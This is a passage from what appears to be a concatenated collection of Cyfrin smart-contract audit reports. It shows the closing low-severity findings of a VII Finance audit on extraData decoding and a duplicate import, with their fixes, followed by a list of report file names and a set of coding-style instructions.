        extraData.length > 0 ? abi.decode(extraData, (uint256, uint256, uint256)) : (0, 0, block.timestamp);

// UniswapV4Wrapper usage
(uint128 amount0Min, uint128 amount1Min, uint256 deadline) = _decodeExtraData(extraData);

function _decodeExtraData(bytes calldata extraData)
    internal
    view
    returns (uint128 amount0Min, uint128 amount1Min, uint256 deadline)
{
    if (extraData.length > 0) {
        (amount0Min, amount1Min, deadline) = abi.decode(extraData, (uint128, uint128, uint256));
    } else {
        (amount0Min, amount1Min, deadline) = (0, 0, block.timestamp);
    }
}
```

However, this is not strictly true since execution of partial unwrap will revert if the length is less than the expected 96 bytes. While there is no impact to decoding bytes of the incorrect length in this case, a fallback to the default values may be preferable over reverting.

**Impact:** Malformed extra data will cause partial unwraps to revert.

**Recommended Mitigation:** Consider decoding extra data only when its length is exactly 96 bytes.

**VII Finance:** Fixed in commit [79741ea](https://github.com/kankodu/vii-finance-smart-contracts/commit/79741eae2590c57902f1c7c5361d878b3023202d).

**Cyfrin:** Verified. The stricter `extraData` length check has been added to ensure correct decoding.


### Duplicated `Math` import should be removed from `ERC721WrapperBase`

**Description:** The OpenZeppelin `Math` library is imported twice in `ERC721WrapperBase`, so one instance can be removed.

**VII Finance:** Fixed in commit [e60cf39](https://github.com/kankodu/vii-finance-smart-contracts/commit/e60cf39ca4e11eb198e6d65b47803f6bf9cd018c).

**Cyfrin:** Verified. The duplicate import has been removed.

\clearpage

------ FILE END car/reports_md/2025-07-15-cyfrin-vii-v2.0.md ------


All files:
car/reports_md/
 2023-03-13-beanstalk_wells_v0.1.md
 2023-04-11-cyfrin-hyperliquid-dex-report.md
 2023-06-01-sudoswap-report.md
 2023-06-07-cyfrin-uniswap-v3-limit-orders.md
 2023-06-13-cyfrin-drop-claim-report-v2.md
 2023-06-16-cyfrin-beanstalk-wells.md
 2023-08-25-cyfrin-stake-link.md
 2023-08-26-cyfrin-dolomite-margin.md
 2023-09-06-cyfrin-woosh.md
 2023-09-12-cyfrin-beanstalk.md
 2023-09-19-cyfrin-stakepet.md
 2023-09-19-cyfrin-swapexchange.md
 2023-10-13-cyfrin-beanstalk-bip-38.md
 2023-11-03-cyfrin-streamr-v2.0.md
 2023-11-05-cyfrin-farcaster-v1.0.md
 2023-11-10-cyfrin-dexe.md
 2023-11-20-cyfrin-mode-earnm.md
 2024-01-10-cyfrin-wormhole-thermae.md
 2024-01-24-cyfrin-solidlyV3.md
 2024-02-23-cyfrin-swell-barracuda.md
 2024-04-06-cyfrin-beefy-finance.md
 2024-04-09-cyfrin-wormhole-evm-cctp-v2-1.md
 2024-04-11-cyfrin-wormhole-evm-ntt-v2.md
 2024-04-14-cyfrin-goldilocks-v1.1.md
 2024-04-18-cyfrin-ondo-finance.md
 2024-05-02-cyfrin-beanstalk-bip-39-v1-2.md
 2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md
 2024-05-24-cyfrin-linea.md
 2024-06-17-cyfrin-templedao-v2.1.md
 2024-07-01-cyfrin-tunnl-v2.0.md
 2024-07-10-cyfrin-casimir-v2.0.md
 2024-07-13-cyfrin-zaros-v2.0.md
 2024-07-23-cyfrin-wormhole-NTT-Diff-v1.0.md
 2024-08-15-cyfrin-earnm-dropbox-v2.0.md
 2024-08-21-cyfrin-chaos-labs-risk-oracle-v2.0.md
 2024-09-13-cyfrin-the-standard-smart-vault-v2.0.md
 2024-09-17-cyfrin-stake-link-v2.0.md
 2024-09-27-cyfrin-bima-v2.0.md
 2024-10-04-cyfrin-wormhole-multigov-v2.0.md
 2024-10-07-cyfrin-pancakeswap-v2.0.md
 2024-10-29-cyfrin-one-world-project-v2.0.md
 2024-11-18-cyfrin-stake.link-metis-staking-v2.0.md
 2024-11-26-cyfrin-m0-v2.0.md
 2024-11-28-cyfrin-linea-v2.0.md
 2024-12-11-cyfrin-benqi-ignite-v2.0.md
 2024-12-17-cyfrin-quantamm-v1.2.md
 2024-12-18-cyfrin-the-standard-auto-redemption-v2.0.md
 2024-12-23-cyfrin-soneium-shibuya-v2.0.md
 2025-01-20-cyfrin-stakedotlink-stakingproxy-v2.0.md
 2025-02-24-cyfrin-d2-v2.1.md
 2025-02-28-cyfrin-stakedotlink-v2.0.md
 2025-03-18-cyfrin-Metamask-DelegationFramework1-v2.0.md
 2025-03-19-cyfrin-linea-spingame-v2.0.md
 2025-03-28-cyfrin-rocko-refinance-v2.0.md
 2025-04-01-cyfrin-Metamask-DelegationFramework2-v2.0.md
 2025-04-09-cyfrin-matrixdock-v2.0.md
 2025-04-24-cyfrin-cryptoart-v2.0.md
 2025-04-24-cyfrin-dolomite-POLVaults-v2.0.md
 2025-04-24-cyfrin-yieldfi-v2.0.md
 2025-05-01-cyfrin-metamask-delegationFramework-part3-v2.0.md
 2025-05-07-cyfrin-metamask-delegationFramework-part4-v2.0.md
 2025-05-08-cyfrin-gas-aave3.3-v1.0.md
 2025-05-16-cyfrin-ethena-timelock-v2.0.md
 2025-05-19-cyfrin-stakedotlink-polygon-staking-v2.0.md
 2025-06-02-cyfrin-evo-soulboundtoken-v2.0.md
 2025-06-04-cyfrin-stakelink-pr152-linkmigrator-v2.0.md
 2025-06-06-cyfrin-eulerswap-v2.1.md
 2025-06-10-cyfrin-bunni-v2.1.md
 2025-06-11-cyfrin-strata-predeposit-v2.1.md
 2025-06-17-cyfrin-yieldfi-pr19-vytoken-v2.2.md
 2025-06-30-cyfrin-linea-spingame-v2-v2.1.md
 2025-07-04-cyfrin-remora-pledge-v2.0.md
 2025-07-07-cyfrin-suzaku-core-v2.0.md
 2025-07-15-cyfrin-vii-v2.0.md
Total size: 3.43 MB

Reminding the important rules:
* Discuss the code changes first, don't suggest any code changes before we agreed on the approach.
* Think of an alternative/better way to do what I ask, don't simply follow my instructions.
* One small code change at a time.
* All code needs to be tested.
* Code needs proper documentation.
* Add comments only when it's not obvious what code is doing, otherwise code should be self-explanatory.
* Focus on code clarity and simplicity, even if it means writing more code (i.e. don't try to be smart or elegant :D).
* Write small functions that do one thing :D It makes the code simpler and easier to test.
* No need to show existing code, just the changes.
* In the response text that is not the code, be very concise.